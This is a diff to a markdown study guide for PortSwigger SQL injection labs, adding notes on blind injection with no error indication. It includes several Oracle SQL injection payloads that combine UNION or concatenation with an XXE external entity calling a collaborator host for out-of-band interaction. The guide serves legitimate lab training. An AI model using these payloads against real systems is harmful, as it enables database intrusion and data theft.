@@ -1193,12 +1193,22 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 >The SQL payload above can also be used to extract the Administrator password for the this [PortSwigger Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) challenge.  
 
->Below SQL payload only makes call to collaboration server but no data is ex-filtrated.  
+### Blind SQLi no indication  
+
+>Placing a single quote at end of the trackingid cookie or search parameter give no internal server error 500. Making educated guess, by using below blind SQLi payload abd combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.  
 
 ```sql
 TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
   
+![SQLi XXE](images/sqli-XXE.png)  
+
+>Additional SQLi payload with XML for reference with ```||``` the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type.  
+
+```
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % umiyp SYSTEM "http://Collaborator.oasti'||'fy.com/">%umiyp;]>'),'/l') from dual)||'
+```  
+
 [PortSwigger Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)  
   
 ### Blind SQLi Conditional Response
